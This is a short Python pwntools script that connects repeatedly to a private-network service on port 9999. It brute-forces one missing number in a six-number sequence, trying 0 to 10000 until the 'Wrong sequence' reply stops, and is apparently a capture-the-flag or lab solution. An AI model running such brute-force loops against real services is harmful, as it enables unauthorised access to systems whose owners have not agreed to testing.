#!/usr/bin/env python3

from pwn import *

host, port = '10.10.96.118', 9999
sequence = "7177 7994 {} 7885 9932 6612"
context.log_level = 'warn'

for p in range(10001):
	
	s = remote(host, port)

	s.recvline()
	s.recvline()
	s.recvline()
	s.recvline()
	s.recvline()

	seq = sequence.format(p)
	print(seq)
	s.sendline(seq)

	response = s.recvline().decode('utf-8')
	if not 'Wrong sequence' in response:
		print(sequence)
		print(s.recvline())
		print(s.recvline())
		break

	print(response)

	s.close()
